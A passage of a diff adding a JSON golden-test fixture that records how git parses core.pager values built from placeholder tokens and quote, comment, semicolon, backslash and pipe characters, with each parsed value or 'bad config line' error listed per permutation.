+      "config": "[core]\n\tpager =  cmd#x\\\\\"\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-537": {
+      "config": "[core]\n\tpager =  cmd#x|\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-540": {
+      "config": "[core]\n\tpager =  cmd;x\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-541": {
+      "config": "[core]\n\tpager =  cmd;xa\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-542": {
+      "config": "[core]\n\tpager =  cmd;x\"\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-543": {
+      "config": "[core]\n\tpager =  cmd;x#\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-544": {
+      "config": "[core]\n\tpager =  cmd;x;\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-545": {
+      "config": "[core]\n\tpager =  cmd;x \n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-546": {
+      "config": "[core]\n\tpager =  cmd;x\\\\\"\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-547": {
+      "config": "[core]\n\tpager =  cmd;x|\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-550": {
+      "config": "[core]\n\tpager =  cmd x\n",
+      "git": [
+        "core.pager=cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-551": {
+      "config": "[core]\n\tpager =  cmd xa\n",
+      "git": [
+        "core.pager=cmd xa"
+      ],
+      "gitError": null
+    },
+    "perm-552": {
+      "config": "[core]\n\tpager =  cmd x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-552.gitconfig"
+    },
+    "perm-553": {
+      "config": "[core]\n\tpager =  cmd x#\n",
+      "git": [
+        "core.pager=cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-554": {
+      "config": "[core]\n\tpager =  cmd x;\n",
+      "git": [
+        "core.pager=cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-555": {
+      "config": "[core]\n\tpager =  cmd x \n",
+      "git": [
+        "core.pager=cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-556": {
+      "config": "[core]\n\tpager =  cmd x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-556.gitconfig"
+    },
+    "perm-557": {
+      "config": "[core]\n\tpager =  cmd x|\n",
+      "git": [
+        "core.pager=cmd x|"
+      ],
+      "gitError": null
+    },
+    "perm-560": {
+      "config": "[core]\n\tpager =  cmd\\\\\"x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-560.gitconfig"
+    },
+    "perm-561": {
+      "config": "[core]\n\tpager =  cmd\\\\\"xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-561.gitconfig"
+    },
+    "perm-562": {
+      "config": "[core]\n\tpager =  cmd\\\\\"x\"\n",
+      "git": [
+        "core.pager=cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-563": {
+      "config": "[core]\n\tpager =  cmd\\\\\"x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-563.gitconfig"
+    },
+    "perm-564": {
+      "config": "[core]\n\tpager =  cmd\\\\\"x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-564.gitconfig"
+    },
+    "perm-565": {
+      "config": "[core]\n\tpager =  cmd\\\\\"x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-565.gitconfig"
+    },
+    "perm-566": {
+      "config": "[core]\n\tpager =  cmd\\\\\"x\\\\\"\n",
+      "git": [
+        "core.pager=cmd\\x\\"
+      ],
+      "gitError": null
+    },
+    "perm-567": {
+      "config": "[core]\n\tpager =  cmd\\\\\"x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-567.gitconfig"
+    },
+    "perm-570": {
+      "config": "[core]\n\tpager =  cmd|x\n",
+      "git": [
+        "core.pager=cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-571": {
+      "config": "[core]\n\tpager =  cmd|xa\n",
+      "git": [
+        "core.pager=cmd|xa"
+      ],
+      "gitError": null
+    },
+    "perm-572": {
+      "config": "[core]\n\tpager =  cmd|x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-572.gitconfig"
+    },
+    "perm-573": {
+      "config": "[core]\n\tpager =  cmd|x#\n",
+      "git": [
+        "core.pager=cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-574": {
+      "config": "[core]\n\tpager =  cmd|x;\n",
+      "git": [
+        "core.pager=cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-575": {
+      "config": "[core]\n\tpager =  cmd|x \n",
+      "git": [
+        "core.pager=cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-576": {
+      "config": "[core]\n\tpager =  cmd|x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-576.gitconfig"
+    },
+    "perm-577": {
+      "config": "[core]\n\tpager =  cmd|x|\n",
+      "git": [
+        "core.pager=cmd|x|"
+      ],
+      "gitError": null
+    },
+    "perm-600": {
+      "config": "[core]\n\tpager = \\\\\"cmdx\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-600.gitconfig"
+    },
+    "perm-601": {
+      "config": "[core]\n\tpager = \\\\\"cmdxa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-601.gitconfig"
+    },
+    "perm-602": {
+      "config": "[core]\n\tpager = \\\\\"cmdx\"\n",
+      "git": [
+        "core.pager=\\cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-603": {
+      "config": "[core]\n\tpager = \\\\\"cmdx#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-603.gitconfig"
+    },
+    "perm-604": {
+      "config": "[core]\n\tpager = \\\\\"cmdx;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-604.gitconfig"
+    },
+    "perm-605": {
+      "config": "[core]\n\tpager = \\\\\"cmdx \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-605.gitconfig"
+    },
+    "perm-606": {
+      "config": "[core]\n\tpager = \\\\\"cmdx\\\\\"\n",
+      "git": [
+        "core.pager=\\cmdx\\"
+      ],
+      "gitError": null
+    },
+    "perm-607": {
+      "config": "[core]\n\tpager = \\\\\"cmdx|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-607.gitconfig"
+    },
+    "perm-610": {
+      "config": "[core]\n\tpager = \\\\\"cmdax\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-610.gitconfig"
+    },
+    "perm-611": {
+      "config": "[core]\n\tpager = \\\\\"cmdaxa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-611.gitconfig"
+    },
+    "perm-612": {
+      "config": "[core]\n\tpager = \\\\\"cmdax\"\n",
+      "git": [
+        "core.pager=\\cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-613": {
+      "config": "[core]\n\tpager = \\\\\"cmdax#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-613.gitconfig"
+    },
+    "perm-614": {
+      "config": "[core]\n\tpager = \\\\\"cmdax;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-614.gitconfig"
+    },
+    "perm-615": {
+      "config": "[core]\n\tpager = \\\\\"cmdax \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-615.gitconfig"
+    },
+    "perm-616": {
+      "config": "[core]\n\tpager = \\\\\"cmdax\\\\\"\n",
+      "git": [
+        "core.pager=\\cmdax\\"
+      ],
+      "gitError": null
+    },
+    "perm-617": {
+      "config": "[core]\n\tpager = \\\\\"cmdax|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-617.gitconfig"
+    },
+    "perm-620": {
+      "config": "[core]\n\tpager = \\\\\"cmd\"x\n",
+      "git": [
+        "core.pager=\\cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-621": {
+      "config": "[core]\n\tpager = \\\\\"cmd\"xa\n",
+      "git": [
+        "core.pager=\\cmdxa"
+      ],
+      "gitError": null
+    },
+    "perm-622": {
+      "config": "[core]\n\tpager = \\\\\"cmd\"x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-622.gitconfig"
+    },
+    "perm-623": {
+      "config": "[core]\n\tpager = \\\\\"cmd\"x#\n",
+      "git": [
+        "core.pager=\\cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-624": {
+      "config": "[core]\n\tpager = \\\\\"cmd\"x;\n",
+      "git": [
+        "core.pager=\\cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-625": {
+      "config": "[core]\n\tpager = \\\\\"cmd\"x \n",
+      "git": [
+        "core.pager=\\cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-626": {
+      "config": "[core]\n\tpager = \\\\\"cmd\"x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-626.gitconfig"
+    },
+    "perm-627": {
+      "config": "[core]\n\tpager = \\\\\"cmd\"x|\n",
+      "git": [
+        "core.pager=\\cmdx|"
+      ],
+      "gitError": null
+    },
+    "perm-630": {
+      "config": "[core]\n\tpager = \\\\\"cmd#x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-630.gitconfig"
+    },
+    "perm-631": {
+      "config": "[core]\n\tpager = \\\\\"cmd#xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-631.gitconfig"
+    },
+    "perm-632": {
+      "config": "[core]\n\tpager = \\\\\"cmd#x\"\n",
+      "git": [
+        "core.pager=\\cmd#x"
+      ],
+      "gitError": null
+    },
+    "perm-633": {
+      "config": "[core]\n\tpager = \\\\\"cmd#x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-633.gitconfig"
+    },
+    "perm-634": {
+      "config": "[core]\n\tpager = \\\\\"cmd#x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-634.gitconfig"
+    },
+    "perm-635": {
+      "config": "[core]\n\tpager = \\\\\"cmd#x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-635.gitconfig"
+    },
+    "perm-636": {
+      "config": "[core]\n\tpager = \\\\\"cmd#x\\\\\"\n",
+      "git": [
+        "core.pager=\\cmd#x\\"
+      ],
+      "gitError": null
+    },
+    "perm-637": {
+      "config": "[core]\n\tpager = \\\\\"cmd#x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-637.gitconfig"
+    },
+    "perm-640": {
+      "config": "[core]\n\tpager = \\\\\"cmd;x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-640.gitconfig"
+    },
+    "perm-641": {
+      "config": "[core]\n\tpager = \\\\\"cmd;xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-641.gitconfig"
+    },
+    "perm-642": {
+      "config": "[core]\n\tpager = \\\\\"cmd;x\"\n",
+      "git": [
+        "core.pager=\\cmd;x"
+      ],
+      "gitError": null
+    },
+    "perm-643": {
+      "config": "[core]\n\tpager = \\\\\"cmd;x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-643.gitconfig"
+    },
+    "perm-644": {
+      "config": "[core]\n\tpager = \\\\\"cmd;x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-644.gitconfig"
+    },
+    "perm-645": {
+      "config": "[core]\n\tpager = \\\\\"cmd;x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-645.gitconfig"
+    },
+    "perm-646": {
+      "config": "[core]\n\tpager = \\\\\"cmd;x\\\\\"\n",
+      "git": [
+        "core.pager=\\cmd;x\\"
+      ],
+      "gitError": null
+    },
+    "perm-647": {
+      "config": "[core]\n\tpager = \\\\\"cmd;x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-647.gitconfig"
+    },
+    "perm-650": {
+      "config": "[core]\n\tpager = \\\\\"cmd x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-650.gitconfig"
+    },
+    "perm-651": {
+      "config": "[core]\n\tpager = \\\\\"cmd xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-651.gitconfig"
+    },
+    "perm-652": {
+      "config": "[core]\n\tpager = \\\\\"cmd x\"\n",
+      "git": [
+        "core.pager=\\cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-653": {
+      "config": "[core]\n\tpager = \\\\\"cmd x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-653.gitconfig"
+    },
+    "perm-654": {
+      "config": "[core]\n\tpager = \\\\\"cmd x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-654.gitconfig"
+    },
+    "perm-655": {
+      "config": "[core]\n\tpager = \\\\\"cmd x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-655.gitconfig"
+    },
+    "perm-656": {
+      "config": "[core]\n\tpager = \\\\\"cmd x\\\\\"\n",
+      "git": [
+        "core.pager=\\cmd x\\"
+      ],
+      "gitError": null
+    },
+    "perm-657": {
+      "config": "[core]\n\tpager = \\\\\"cmd x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-657.gitconfig"
+    },
+    "perm-660": {
+      "config": "[core]\n\tpager = \\\\\"cmd\\\\\"x\n",
+      "git": [
+        "core.pager=\\cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-661": {
+      "config": "[core]\n\tpager = \\\\\"cmd\\\\\"xa\n",
+      "git": [
+        "core.pager=\\cmd\\xa"
+      ],
+      "gitError": null
+    },
+    "perm-662": {
+      "config": "[core]\n\tpager = \\\\\"cmd\\\\\"x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-662.gitconfig"
+    },
+    "perm-663": {
+      "config": "[core]\n\tpager = \\\\\"cmd\\\\\"x#\n",
+      "git": [
+        "core.pager=\\cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-664": {
+      "config": "[core]\n\tpager = \\\\\"cmd\\\\\"x;\n",
+      "git": [
+        "core.pager=\\cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-665": {
+      "config": "[core]\n\tpager = \\\\\"cmd\\\\\"x \n",
+      "git": [
+        "core.pager=\\cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-666": {
+      "config": "[core]\n\tpager = \\\\\"cmd\\\\\"x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-666.gitconfig"
+    },
+    "perm-667": {
+      "config": "[core]\n\tpager = \\\\\"cmd\\\\\"x|\n",
+      "git": [
+        "core.pager=\\cmd\\x|"
+      ],
+      "gitError": null
+    },
+    "perm-670": {
+      "config": "[core]\n\tpager = \\\\\"cmd|x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-670.gitconfig"
+    },
+    "perm-671": {
+      "config": "[core]\n\tpager = \\\\\"cmd|xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-671.gitconfig"
+    },
+    "perm-672": {
+      "config": "[core]\n\tpager = \\\\\"cmd|x\"\n",
+      "git": [
+        "core.pager=\\cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-673": {
+      "config": "[core]\n\tpager = \\\\\"cmd|x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-673.gitconfig"
+    },
+    "perm-674": {
+      "config": "[core]\n\tpager = \\\\\"cmd|x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-674.gitconfig"
+    },
+    "perm-675": {
+      "config": "[core]\n\tpager = \\\\\"cmd|x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-675.gitconfig"
+    },
+    "perm-676": {
+      "config": "[core]\n\tpager = \\\\\"cmd|x\\\\\"\n",
+      "git": [
+        "core.pager=\\cmd|x\\"
+      ],
+      "gitError": null
+    },
+    "perm-677": {
+      "config": "[core]\n\tpager = \\\\\"cmd|x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-677.gitconfig"
+    },
+    "perm-700": {
+      "config": "[core]\n\tpager = |cmdx\n",
+      "git": [
+        "core.pager=|cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-701": {
+      "config": "[core]\n\tpager = |cmdxa\n",
+      "git": [
+        "core.pager=|cmdxa"
+      ],
+      "gitError": null
+    },
+    "perm-702": {
+      "config": "[core]\n\tpager = |cmdx\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-702.gitconfig"
+    },
+    "perm-703": {
+      "config": "[core]\n\tpager = |cmdx#\n",
+      "git": [
+        "core.pager=|cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-704": {
+      "config": "[core]\n\tpager = |cmdx;\n",
+      "git": [
+        "core.pager=|cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-705": {
+      "config": "[core]\n\tpager = |cmdx \n",
+      "git": [
+        "core.pager=|cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-706": {
+      "config": "[core]\n\tpager = |cmdx\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-706.gitconfig"
+    },
+    "perm-707": {
+      "config": "[core]\n\tpager = |cmdx|\n",
+      "git": [
+        "core.pager=|cmdx|"
+      ],
+      "gitError": null
+    },
+    "perm-710": {
+      "config": "[core]\n\tpager = |cmdax\n",
+      "git": [
+        "core.pager=|cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-711": {
+      "config": "[core]\n\tpager = |cmdaxa\n",
+      "git": [
+        "core.pager=|cmdaxa"
+      ],
+      "gitError": null
+    },
+    "perm-712": {
+      "config": "[core]\n\tpager = |cmdax\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-712.gitconfig"
+    },
+    "perm-713": {
+      "config": "[core]\n\tpager = |cmdax#\n",
+      "git": [
+        "core.pager=|cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-714": {
+      "config": "[core]\n\tpager = |cmdax;\n",
+      "git": [
+        "core.pager=|cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-715": {
+      "config": "[core]\n\tpager = |cmdax \n",
+      "git": [
+        "core.pager=|cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-716": {
+      "config": "[core]\n\tpager = |cmdax\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-716.gitconfig"
+    },
+    "perm-717": {
+      "config": "[core]\n\tpager = |cmdax|\n",
+      "git": [
+        "core.pager=|cmdax|"
+      ],
+      "gitError": null
+    },
+    "perm-720": {
+      "config": "[core]\n\tpager = |cmd\"x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-720.gitconfig"
+    },
+    "perm-721": {
+      "config": "[core]\n\tpager = |cmd\"xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-721.gitconfig"
+    },
+    "perm-722": {
+      "config": "[core]\n\tpager = |cmd\"x\"\n",
+      "git": [
+        "core.pager=|cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-723": {
+      "config": "[core]\n\tpager = |cmd\"x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-723.gitconfig"
+    },
+    "perm-724": {
+      "config": "[core]\n\tpager = |cmd\"x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-724.gitconfig"
+    },
+    "perm-725": {
+      "config": "[core]\n\tpager = |cmd\"x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-725.gitconfig"
+    },
+    "perm-726": {
+      "config": "[core]\n\tpager = |cmd\"x\\\\\"\n",
+      "git": [
+        "core.pager=|cmdx\\"
+      ],
+      "gitError": null
+    },
+    "perm-727": {
+      "config": "[core]\n\tpager = |cmd\"x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-727.gitconfig"
+    },
+    "perm-730": {
+      "config": "[core]\n\tpager = |cmd#x\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-731": {
+      "config": "[core]\n\tpager = |cmd#xa\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-732": {
+      "config": "[core]\n\tpager = |cmd#x\"\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-733": {
+      "config": "[core]\n\tpager = |cmd#x#\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-734": {
+      "config": "[core]\n\tpager = |cmd#x;\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-735": {
+      "config": "[core]\n\tpager = |cmd#x \n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-736": {
+      "config": "[core]\n\tpager = |cmd#x\\\\\"\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-737": {
+      "config": "[core]\n\tpager = |cmd#x|\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-740": {
+      "config": "[core]\n\tpager = |cmd;x\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-741": {
+      "config": "[core]\n\tpager = |cmd;xa\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-742": {
+      "config": "[core]\n\tpager = |cmd;x\"\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-743": {
+      "config": "[core]\n\tpager = |cmd;x#\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-744": {
+      "config": "[core]\n\tpager = |cmd;x;\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-745": {
+      "config": "[core]\n\tpager = |cmd;x \n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-746": {
+      "config": "[core]\n\tpager = |cmd;x\\\\\"\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-747": {
+      "config": "[core]\n\tpager = |cmd;x|\n",
+      "git": [
+        "core.pager=|cmd"
+      ],
+      "gitError": null
+    },
+    "perm-750": {
+      "config": "[core]\n\tpager = |cmd x\n",
+      "git": [
+        "core.pager=|cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-751": {
+      "config": "[core]\n\tpager = |cmd xa\n",
+      "git": [
+        "core.pager=|cmd xa"
+      ],
+      "gitError": null
+    },
+    "perm-752": {
+      "config": "[core]\n\tpager = |cmd x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-752.gitconfig"
+    },
+    "perm-753": {
+      "config": "[core]\n\tpager = |cmd x#\n",
+      "git": [
+        "core.pager=|cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-754": {
+      "config": "[core]\n\tpager = |cmd x;\n",
+      "git": [
+        "core.pager=|cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-755": {
+      "config": "[core]\n\tpager = |cmd x \n",
+      "git": [
+        "core.pager=|cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-756": {
+      "config": "[core]\n\tpager = |cmd x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-756.gitconfig"
+    },
+    "perm-757": {
+      "config": "[core]\n\tpager = |cmd x|\n",
+      "git": [
+        "core.pager=|cmd x|"
+      ],
+      "gitError": null
+    },
+    "perm-760": {
+      "config": "[core]\n\tpager = |cmd\\\\\"x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-760.gitconfig"
+    },
+    "perm-761": {
+      "config": "[core]\n\tpager = |cmd\\\\\"xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-761.gitconfig"
+    },
+    "perm-762": {
+      "config": "[core]\n\tpager = |cmd\\\\\"x\"\n",
+      "git": [
+        "core.pager=|cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-763": {
+      "config": "[core]\n\tpager = |cmd\\\\\"x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-763.gitconfig"
+    },
+    "perm-764": {
+      "config": "[core]\n\tpager = |cmd\\\\\"x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-764.gitconfig"
+    },
+    "perm-765": {
+      "config": "[core]\n\tpager = |cmd\\\\\"x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-765.gitconfig"
+    },
+    "perm-766": {
+      "config": "[core]\n\tpager = |cmd\\\\\"x\\\\\"\n",
+      "git": [
+        "core.pager=|cmd\\x\\"
+      ],
+      "gitError": null
+    },
+    "perm-767": {
+      "config": "[core]\n\tpager = |cmd\\\\\"x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-767.gitconfig"
+    },
+    "perm-770": {
+      "config": "[core]\n\tpager = |cmd|x\n",
+      "git": [
+        "core.pager=|cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-771": {
+      "config": "[core]\n\tpager = |cmd|xa\n",
+      "git": [
+        "core.pager=|cmd|xa"
+      ],
+      "gitError": null
+    },
+    "perm-772": {
+      "config": "[core]\n\tpager = |cmd|x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-772.gitconfig"
+    },
+    "perm-773": {
+      "config": "[core]\n\tpager = |cmd|x#\n",
+      "git": [
+        "core.pager=|cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-774": {
+      "config": "[core]\n\tpager = |cmd|x;\n",
+      "git": [
+        "core.pager=|cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-775": {
+      "config": "[core]\n\tpager = |cmd|x \n",
+      "git": [
+        "core.pager=|cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-776": {
+      "config": "[core]\n\tpager = |cmd|x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-776.gitconfig"
+    },
+    "perm-777": {
+      "config": "[core]\n\tpager = |cmd|x|\n",
+      "git": [
+        "core.pager=|cmd|x|"
+      ],
+      "gitError": null
     }
   }
 }
